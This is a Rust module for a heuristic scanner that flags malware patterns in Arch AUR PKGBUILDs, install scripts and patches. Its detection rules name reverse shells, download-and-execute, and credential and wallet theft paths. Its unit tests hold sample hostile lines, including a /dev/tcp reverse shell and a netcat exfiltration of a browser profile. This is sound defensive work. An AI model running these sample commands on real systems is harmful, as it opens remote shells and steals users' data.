//! Static analysis of PKGBUILDs, install scripts and patches.
//!
//! This is heuristic: it cannot prove a package is safe, it points a human
//! reviewer at the lines that deserve attention. Rules are deliberately
//! biased towards patterns seen in real AUR malware (download-and-execute,
//! reverse shells, credential theft, persistence).

use crate::util::{cyan, red, yellow};
use regex::Regex;
use std::collections::BTreeSet;
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Low,
    Medium,
    High,
}

impl Severity {
    pub fn label(self) -> String {
        match self {
            Severity::High => red("HIGH"),
            Severity::Medium => yellow("MED "),
            Severity::Low => cyan("LOW "),
        }
    }
}

#[derive(Debug, Clone)]
pub struct Finding {
    pub severity: Severity,
    pub rule: &'static str,
    pub message: String,
    pub file: String,
    pub line: usize,
    pub snippet: String,
    /// False when the same finding already existed at the last reviewed commit.
    pub is_new: bool,
}

#[derive(Clone, Copy, PartialEq)]
enum Scope {
    Any,
    Pkgbuild,
    Install,
}

struct Rule {
    id: &'static str,
    severity: Severity,
    message: &'static str,
    pattern: &'static str,
    scope: Scope,
}

use Scope::*;
use Severity::*;

const RULES: &[Rule] = &[
    Rule {
        id: "pipe-to-shell",
        severity: High,
        message: "downloads content and pipes it straight into a shell",
        pattern: r"\b(curl|wget)\b[^|;&\n]*\|\s*(sudo\s+)?(ba|z|da|k|fi)?sh\b",
        scope: Any,
    },
    Rule {
        id: "shell-from-download",
        severity: High,
        message: "runs a shell on downloaded content",
        pattern: r#"\b(ba|z|da)?sh\s+(-c\s+)?["']?[<$]\(\s*(curl|wget)"#,
        scope: Any,
    },
    Rule {
        id: "decode-and-exec",
        severity: High,
        message: "decodes embedded data and executes it",
        pattern: r"(base64\s+(-d|--decode)|xxd\s+-r|openssl\s+(enc|base64)\b[^|\n]*\s-d)[^\n]*\|\s*(sudo\s+)?(ba|z|da)?sh\b",
        scope: Any,
    },
    Rule {
        id: "eval-obfuscated",
        severity: High,
        message: "evaluates decoded or hex-escaped data",
        pattern: r"\beval\b[^\n]*(base64|xxd|\\x[0-9a-fA-F]{2})",
        scope: Any,
    },
    Rule {
        id: "inline-interpreter",
        severity: High,
        message: "inline interpreter code that decodes or executes a payload",
        pattern: r"\b(python[23]?|perl|ruby|node)\s+-(c|e)\s[^\n]*(exec|eval|b64decode|decode\(|fromCharCode|system\()",
        scope: Any,
    },
    Rule {
        id: "dev-tcp",
        severity: High,
        message: "raw network socket via /dev/tcp (typical reverse shell)",
        pattern: r"/dev/(tcp|udp)/",
        scope: Any,
    },
    Rule {
        id: "netcat-exec",
        severity: High,
        message: "netcat/socat spawning a program (typical reverse shell)",
        pattern: r"\b(nc|ncat|netcat)\b[^\n]*\s-[a-z]*[ec]\b|\bsocat\b[^\n]*\b(exec|system):",
        scope: Any,
    },
    Rule {
        id: "ld-preload",
        severity: High,
        message: "touches the dynamic linker preload (library injection)",
        pattern: r"/etc/ld\.so\.preload|\bLD_PRELOAD=",
        scope: Any,
    },
    Rule {
        id: "credential-access",
        severity: High,
        message: "accesses browser profiles, keyrings, wallets or credentials",
        pattern: r"\.mozilla/|\.config/(google-chrome|chromium|BraveSoftware|discord)|\.gnupg/|\.aws/credentials|\.ssh/id_|wallet\.dat|\.password-store",
        scope: Any,
    },
    Rule {
        id: "rm-root",
        severity: High,
        message: "deletes the root or home directory",
        pattern: r#"\brm\s+(-[A-Za-z]+\s+)*["']?(/|~|\$HOME|\$\{HOME\})["']?(\s|$|/\*)"#,
        scope: Any,
    },
    Rule {
        id: "install-network",
        severity: High,
        message: "install script downloads from the network (runs as root)",
        pattern: r"\b(curl|wget|aria2c)\s",
        scope: Install,
    },
    Rule {
        id: "shell-startup",
        severity: Medium,
        message: "modifies shell startup files or SSH configuration",
        pattern: r"\.(bashrc|zshrc|bash_profile|zprofile)\b|/\.profile\b|authorized_keys|\.ssh/config",
        scope: Any,
    },
    Rule {
        id: "persistence",
        severity: Medium,
        message: "enables services or cron jobs at install time",
        pattern: r"\bsystemctl\s+(--[a-z-]+\s+)*(enable|start|restart)\b|\bcrontab\b",
        scope: Any,
    },
    Rule {
        id: "setuid",
        severity: Medium,
        message: "sets setuid/setgid bits",
        pattern: r"\bchmod\s+(-[A-Za-z]+\s+)*([ugoa]*\+[rwxt]*s|0?[2467][0-7]{3}\b)",
        scope: Any,
    },
    Rule {
        id: "immutable",
        severity: Medium,
        message: "makes files immutable (hard to remove)",
        pattern: r"\bchattr\s+[^\n]*\+i\b",
        scope: Any,
    },
    Rule {
        id: "raw-ip-url",
        severity: Medium,
        message: "downloads from a bare IP address",
        pattern: r"\b(https?|ftp)://\d{1,3}(\.\d{1,3}){3}\b",
        scope: Any,
    },
    Rule {
        id: "suspicious-host",
        severity: Medium,
        message: "uses a URL shortener, paste site, file drop or tunnel",
        pattern: r#"(?i)\bhttps?://([a-z0-9-]+\.)*(bit\.ly|tinyurl\.com|is\.gd|cutt\.ly|goo\.gl|t\.co|pastebin\.com|paste\.ee|hastebin\.com|transfer\.sh|0x0\.st|termbin\.com|temp\.sh|file\.io|ngrok\.io|ngrok-free\.app|trycloudflare\.com|discordapp\.com|discord\.gg)(/|\s|$|["'])"#,
        scope: Any,
    },
    Rule {
        id: "sudo-in-pkgbuild",
        severity: Medium,
        message: "PKGBUILD calls sudo (builds must never need root)",
        pattern: r"\bsudo\s",
        scope: Pkgbuild,
    },
    Rule {
        id: "hidden-tmp",
        severity: Medium,
        message: "writes or runs hidden files in /tmp or /dev/shm",
        pattern: r"/(tmp|dev/shm)/\.[A-Za-z0-9_]",
        scope: Any,
    },
    Rule {
        id: "disable-security",
        severity: Medium,
        message: "disables security features or shell history",
        pattern: r"\bsetenforce\s+0|\baa-teardown\b|\bufw\s+disable|\biptables\s+-F|\bunset\s+HISTFILE|HISTFILE=/dev/null",
        scope: Any,
    },
    Rule {
        id: "network-in-build",
        severity: Low,
        message: "fetches from the network outside source=() (unverified by checksums)",
        pattern: r"\b(curl|wget|aria2c)\s",
        scope: Pkgbuild,
    },
    Rule {
        id: "eval-dynamic",
        severity: Low,
        message: "eval of dynamic content",
        pattern: r#"\beval\s+["']?\$"#,
        scope: Any,
    },
];

fn compiled() -> &'static [(&'static Rule, Regex)] {
    static R: OnceLock<Vec<(&'static Rule, Regex)>> = OnceLock::new();
    R.get_or_init(|| {
        RULES
            .iter()
            .map(|r| (r, Regex::new(r.pattern).expect("invalid audit rule")))
            .collect()
    })
}

fn shorten(s: &str) -> String {
    const MAX: usize = 140;
    if s.chars().count() <= MAX {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(MAX).collect::<String>())
    }
}

/// Very long base64-looking tokens are a common way to hide payloads.
fn has_long_blob(line: &str) -> bool {
    line.split(|c: char| !(c.is_ascii_alphanumeric() || "+/=".contains(c)))
        .any(|tok| {
            tok.len() >= 200
                && tok.bytes().any(|b| b.is_ascii_uppercase())
                && tok.bytes().any(|b| b.is_ascii_lowercase())
                && tok.bytes().any(|b| b.is_ascii_digit())
        })
}

pub fn scan(file: &str, content: &str) -> Vec<Finding> {
    let name = file.rsplit('/').next().unwrap_or(file);
    let scope = if name == "PKGBUILD" {
        Pkgbuild
    } else if name.ends_with(".install") {
        Install
    } else {
        Any
    };
    let is_patch = name.ends_with(".patch") || name.ends_with(".diff");

    let mut out = Vec::new();
    for (i, raw) in content.lines().enumerate() {
        // In patches only the added lines matter.
        let line = if is_patch {
            match raw.strip_prefix('+') {
                Some(l) if !l.starts_with("++") => l,
                _ => continue,
            }
        } else {
            raw
        };
        let t = line.trim();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let mut line_hits: Vec<Finding> = Vec::new();
        for (rule, re) in compiled() {
            if rule.scope != Any && rule.scope != scope {
                continue;
            }
            if re.is_match(line) {
                line_hits.push(Finding {
                    severity: rule.severity,
                    rule: rule.id,
                    message: rule.message.into(),
                    file: file.into(),
                    line: i + 1,
                    snippet: shorten(t),
                    is_new: true,
                });
            }
        }
        if has_long_blob(line) {
            line_hits.push(Finding {
                severity: Medium,
                rule: "encoded-blob",
                message: "very long encoded blob (possible hidden payload)".into(),
                file: file.into(),
                line: i + 1,
                snippet: shorten(t),
                is_new: true,
            });
        }
        // Don't add low-severity noise to a line that already has a real hit.
        if line_hits.iter().any(|f| f.severity > Low) {
            line_hits.retain(|f| f.severity > Low);
        }
        out.extend(line_hits);
    }
    out
}

/// Hosts referenced by URLs in a file (used to detect new download hosts).
pub fn hosts(content: &str) -> BTreeSet<String> {
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| Regex::new(r"(?i)\b(?:https?|ftp)://([a-z0-9.-]+)").unwrap());
    content
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .flat_map(|l| {
            re.captures_iter(l)
                .map(|c| c[1].to_lowercase())
                .collect::<Vec<_>>()
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(file: &str, s: &str) -> Vec<&'static str> {
        scan(file, s).into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn detects_malicious_patterns() {
        assert_eq!(
            rules("PKGBUILD", "  curl -fsSL https://x.io/i | bash"),
            ["pipe-to-shell"]
        );
        assert!(
            rules("PKGBUILD", r#"bash -c "$(curl -s http://1.2.3.4/a)""#)
                .contains(&"shell-from-download")
        );
        assert!(rules("PKGBUILD", "echo aGk= | base64 -d | sh").contains(&"decode-and-exec"));
        assert!(
            rules("foo.install", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").contains(&"dev-tcp")
        );
        assert!(rules("foo.install", "wget -q https://example.com/x").contains(&"install-network"));
        assert!(
            rules(
                "PKGBUILD",
                "python -c 'import base64;exec(base64.b64decode(x))'"
            )
            .contains(&"inline-interpreter")
        );
        assert!(
            rules("PKGBUILD", "tar czf - ~/.mozilla/ | nc host 1").contains(&"credential-access")
        );
        assert!(rules("PKGBUILD", "chmod 4755 \"$pkgdir/usr/bin/x\"").contains(&"setuid"));
        assert!(rules("PKGBUILD", "source=(https://bit.ly/abc)").contains(&"suspicious-host"));
    }

    #[test]
    fn ignores_normal_pkgbuild_lines() {
        let ok = r#"
pkgname=foo
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')
# curl https://evil | sh   <- comments are ignored
package() {
  install -Dm755 foo "$pkgdir/usr/bin/foo"
  chmod 755 "$pkgdir/usr/bin/foo"
  rm -rf "$pkgdir/usr/share/doc"
  install -Dm644 foo.service "$pkgdir/usr/lib/systemd/system/foo.service"
}
"#;
        assert!(
            scan("PKGBUILD", ok).is_empty(),
            "{:?}",
            scan("PKGBUILD", ok)
        );
    }

    #[test]
    fn patches_only_scan_added_lines() {
        let p = "-curl x | sh\n context\n+++ b/file\n+wget y | bash\n";
        let f = scan("fix.patch", p);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].line, 4);
    }

    #[test]
    fn host_extraction() {
        let h = hosts(
            "source=(git+https://GitHub.com/a/b https://files.x.org/y)\n# https://ignored.net",
        );
        assert_eq!(
            h.into_iter().collect::<Vec<_>>(),
            ["files.x.org", "github.com"]
        );
    }
}
